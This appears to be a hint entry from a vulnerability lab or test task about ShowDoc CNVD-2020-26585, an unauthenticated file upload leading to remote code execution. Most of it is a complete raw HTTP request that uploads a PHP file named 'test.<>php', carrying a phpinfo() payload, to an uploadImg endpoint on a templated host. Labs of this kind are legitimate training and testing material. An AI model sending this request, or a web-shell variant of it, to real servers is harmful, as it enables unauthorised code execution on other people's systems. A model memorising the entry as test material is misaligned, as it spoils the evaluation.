  high:
  - 'Vulnerability: ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585).'
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Exploit

    Simply send following request to upload a PHP file:

    ```
    POST /index.php?s=/home/page/uploadImg HTTP/1.1
    Host: {{NODE_IP}}:8080
    Accept-Encoding: gzip, deflate, br
    Accept: */*
    Accept-Language: en-US;q=0.9,en;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
    Connection: close
    Cache-Control: max-age=0
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl

    ------WebKitFormBoundary0RdOKBR8AmAxfRyl
    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
    Content-Type: text/plain

    <?=phpinfo();?>
    ------WebKitFormBoundary0RdOKBR8AmAxfRyl--

    ```

    PHP file address will be respond:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/1.png

    `phpinfo()` is executed successfully:

